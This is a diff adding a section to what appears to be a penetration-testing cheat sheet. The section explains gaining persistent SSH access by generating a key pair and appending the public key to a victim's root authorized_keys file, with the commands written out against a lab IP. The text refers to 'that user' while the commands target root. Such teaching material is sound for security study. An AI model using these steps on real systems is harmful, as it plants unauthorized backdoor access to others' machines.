@@ -302,3 +302,23 @@ On the victim's machine:
 export TERM=xterm-256color
 stty rows 60 columns 300
 ```
+
+### Gain a shell with write access to a users .ssh directory
+
+If we find ourselves with write access to a users`/.ssh/` directory, we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with `ssh-keygen` and the `-f` flag to specify the output file:
+
+```
+ssh-keygen -f key
+```
+
+This will give us two files: `key` (which we will use with `ssh -i`) and `key.pub`, which we will copy to the remote machine. Let us copy `key.pub`, then on the remote machine, we will add it into `/root/.ssh/authorized_keys`:
+
+```
+user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
+```
+
+Now, the remote server should allow us to log in as that user by using our private key:
+
+```
+ssh root@10.10.10.10 -i key
+```
